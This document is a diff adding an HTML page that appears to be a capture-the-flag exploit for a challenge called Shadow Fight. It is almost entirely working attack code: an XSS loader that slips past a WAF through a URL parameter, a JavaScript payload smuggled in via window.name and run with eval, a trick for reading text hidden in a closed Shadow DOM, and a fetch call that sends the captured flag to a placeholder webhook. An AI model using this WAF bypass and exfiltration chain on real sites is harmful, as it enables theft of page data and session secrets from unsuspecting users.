@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Shadow Fight Exploit</title>
+</head>
+<body>
+    <h1>Exploiting...</h1>
+    <script>
+        // 1. The Payload
+        // This code runs INSIDE the challenge page.
+        // Since it is passed via window.name, the WAF (helpers.js) does NOT check it.
+        // We can use 'fetch', 'document', etc. freely here.
+        var payload = `
+            // Use Chrome's window.find() to pierce the closed Shadow DOM
+            // This highlights the text 'p_ctf' even if it is inside a shadow root
+            window.find('p_ctf');
+
+            // Get the highlighted text (the flag)
+            var flag = window.getSelection().anchorNode.textContent;
+
+            // Send the flag to your listener
+            fetch('YOUR_WEBHOOK_URL?flag=' + encodeURIComponent(flag));
+        `;
+
+        // 2. The Target
+        // We inject the loader: <svg/onload=eval(name)>
+        // It fits in 50 chars and passes the WAF.
+        // Note: We need a valid avatar URL to pass validation.
+        var target = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(name)%3E&avatar=https://picsum.photos/100";
+
+        // 3. Execution
+        // window.open sets the new window's 'name' property to our payload.
+        // When the SVG loads, it runs eval(name), executing our payload.
+        window.open(target, payload);
+        
+        // Optional: Redirect back after a delay to clean up
+        setTimeout(() => { window.location.href = 'about:blank'; }, 5000);
+    </script>
+</body>
+</html>
